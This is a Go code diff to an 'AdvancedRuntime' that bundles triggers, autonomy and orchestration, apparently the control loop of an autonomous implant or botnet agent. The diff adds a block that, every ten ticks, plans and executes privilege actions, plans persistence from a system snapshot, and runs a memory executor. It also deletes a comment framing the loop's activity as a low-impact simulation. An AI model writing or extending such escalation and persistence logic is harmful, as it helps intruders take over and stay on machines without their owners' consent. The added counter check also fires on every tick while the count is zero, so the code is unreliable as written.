@@ -10,6 +10,7 @@ import (
 
 // AdvancedRuntime bundles higher-order behaviors (triggers, autonomy, orchestration, retention).
 type AdvancedRuntime struct {
+	logger       *slog.Logger
 	orchestrator *NativeOrchestrator
 	memoryExec   MemoryExecutor
 	transformer  *TransformationManager
@@ -24,6 +25,7 @@ type AdvancedRuntime struct {
 
 func NewAdvancedRuntime(logger *slog.Logger, eng *TransformationManager, messenger *networking.EncryptedMessenger) *AdvancedRuntime {
 	return &AdvancedRuntime{
+		logger:       logger,
 		orchestrator: NewNativeOrchestrator(nil),
 		memoryExec:   MemoryExecutor{},
 		transformer:  eng,
@@ -50,10 +52,16 @@ func (ar *AdvancedRuntime) Run(ctx context.Context, peerCount func() int) {
 		case now := <-ticker.C:
 			state := ActivationState{Now: now, PeerCount: peerCount(), LastExecution: lastExec, NetworkIdle: true}
 			if ar.triggers.ShouldActivate(state) && ar.stateMachine.Tick(now, executed) {
-				// Low-impact action: refresh vault entry timestamp to simulate activity
 				ar.vault.Put("heartbeat", "alive", time.Minute*5)
 				lastExec = now
 				executed++
+			}
+			// Periodic privilege and persistence actions every 10 ticks
+			if executed%10 == 0 {
+				plan := ar.privPlanner.Plan()
+				ar.privPlanner.Execute(plan)
+				ar.persistence.Plan(ar.inspector.Snapshot())
+				ar.memoryExec.Execute(ar.orchestrator, ar.transformer, ar.inspector)
 			}
 		}
 	}
